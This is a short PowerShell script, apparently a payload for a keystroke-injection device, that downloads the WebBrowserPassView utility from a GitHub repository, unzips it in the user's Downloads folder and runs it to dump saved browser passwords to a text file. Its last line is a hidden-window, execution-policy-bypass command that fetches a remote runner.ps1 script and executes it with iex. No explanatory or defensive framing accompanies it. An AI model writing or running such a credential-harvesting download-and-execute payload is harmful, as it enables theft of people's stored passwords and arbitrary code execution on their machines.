$nameFile="WebBrowserPassView"
$runDirectory="$env:USERPROFILE\downloads"

$zipFolder="$runDirectory\$nameFile.zip"
$unzipFolder="$runDirectory\$nameFile"
$exeFile="$unzipFolder\$nameFile.exe"
$txtFile="$unzipFolder\$nameFile.txt"

$params="/stext"

Set-Location -path $runDirectory
Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
Expand-Archive $zipFolder -DestinationPath $unzipFolder

$exeFile $params $txtFile
$txtFile

#STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex
